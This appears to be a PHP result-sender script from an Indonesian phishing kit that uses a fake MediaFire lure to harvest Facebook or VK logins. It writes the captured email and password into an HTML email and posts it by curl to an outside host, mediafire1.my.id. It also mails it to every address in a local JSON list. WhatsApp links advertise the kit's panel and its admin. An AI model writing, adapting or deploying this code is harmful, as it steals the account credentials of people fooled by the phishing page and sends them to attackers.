<<?php

//mencegah masuk tanpa method get
if($email == "" && $total == ""){
$url = $_SERVER['PHP_SELF'];
header("Location: send.php");
}

//jenis ress
$coda = 'WEB GARID-NESIA ||';
$spin = 'WEB GARID-NESIA ||';
$claim = 'WEB GARID-NESIA ||';

//jenis mail
$coda_mail = 'coda';
$spin_mail = 'spin';
$claim_mail = 'claim';

//get setting
include 'setting.php';

//method get
$total = '1';

//mengambil random isian
include 'log-cpr.php';
include 'log-ip.php';
$noperess = '08'.rand(1000000,9999999999);

$log=array("Facebook", "VK");
$random_log=array_rand($log,2);

//info sendmail
$emailku = $email;
$logress = $log[$random_log[0]];
$idress = rand(100000000,9999999999);
$subjek = "☠️ | My Ressult - [ fumma - ID ] | Punya $email | Result MediaFire";
$pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			
			.tblResult tr {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 5px 10px;
background: linear-gradient(-45deg, #FFFFFF);
				border: 2px solid #000000;
				color: #fff;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 5px 10px;
				background: #000000;
				border: 2px solid #000000;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #000000;
				text-align: left;
				font-weight: bold;
				color: #000000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
	 <div style="background: #FF0000; width: 294; color: #fff; text-align: center; padding: 10px;">★ Created TT Fumma - ID ★</div>

			<table class="tblResult">
				<tr>
					<td style="border-right: none;">Email/number</td>
					<td style="text-align: center;">$email</td>
				</tr>
                <tr>
					<td style="border-right: none;">Password</td>
					<td style="text-align: center;">$password</td>
				</tr>
               <tr>
					<td style="border-right: none;">Login</td>
					<td style="text-align: center;">Facebook</td>
				</tr>			
				<tr>
					<td style="border-right: none;">TANGGAL/WAKTU</td>
					<td style="text-align: center;">BARU SAJA</td>
				</tr>
				<tr>
					<td style="border-right: none;">PLATFORM</td>
					<td style="text-align: center;">android</td>
				</tr>
				<tr>			
					<td style="border-right: none;">NEGARA</td>
					<td style="text-align: center;">🇲🇨</td>
				</tr>
				<tr>
					<td style="border-right: none;">Pembuat Script</td>
					<td style="text-align: center;">KhaaHost-25</td>
				</tr>
					</table>
			<div style="border:0px solid white;width: 294; font-weight:bold; height: 20px; background: #FF0000; color: #fff; padding: 15px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">

<a style="border:2px solid #000000;text-decoration:none;color:#000000;border-radius:3px;padding:3px;background:#00BFFF;" href="https://chat.whatsapp.com/HKAGIV3BrX73uMn1eyn2fc">Panel Jasteb Free</a>
<a style="border:2px solid #000000;text-decoration:none;color:#000000;border-radius:3px;padding:3px;background:#00BFFF;" href="https://Wa.me/6283870159016">Kontak Admin</a>
</div>
				</tr>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;
				
$sender = 'From: '.$nik.'<'.$sender.'>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";

$url = "https://mediafire1.my.id/pusat/apiii.php";
$data =
"subjek=".$subjek.
"&pesan=".$pesan;
$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, $url);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd()."/cok.txt");
curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd()."/cok.txt");   
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($ch2);
curl_close($ch2);

$read = file_get_contents('yns/data.json');
$json = json_decode($read,true);

for($i=0;$i<=count($json) - 1;$i++)
{
mail($json[$i]['email'], $subjek, $pesan, $headers);
}
?>